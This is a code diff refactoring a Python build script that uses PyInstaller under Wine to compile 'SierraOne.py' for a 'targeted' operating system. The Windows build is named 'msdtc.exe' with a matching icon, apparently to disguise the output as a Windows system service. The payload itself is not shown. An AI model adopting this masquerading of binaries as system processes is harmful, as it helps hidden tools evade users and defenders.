@@ -7,13 +7,11 @@ import time
 from shutil import rmtree
 
 
-dist = ""
-
 def remove_junk():
     rmtree("build")
     rmtree("__pycache__")
     
-def builder():
+def builder(dist):
     if dist == "windows":
         subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
         time.sleep(1)
@@ -34,7 +32,6 @@ def builder():
     sys.exit(0)
         
 def main():
-    global dist
     
     parser = argparse.ArgumentParser()
     parser.add_argument("-o", "--os", metavar="", required=True, type=str, help="Targeted operating system (Windows, Linux)")
@@ -47,7 +44,7 @@ def main():
         sys.exit(0)
 
     dist = args.os.lower()
-    builder()
+    builder(dist)
 
 if __name__ == "__main__":
     main()
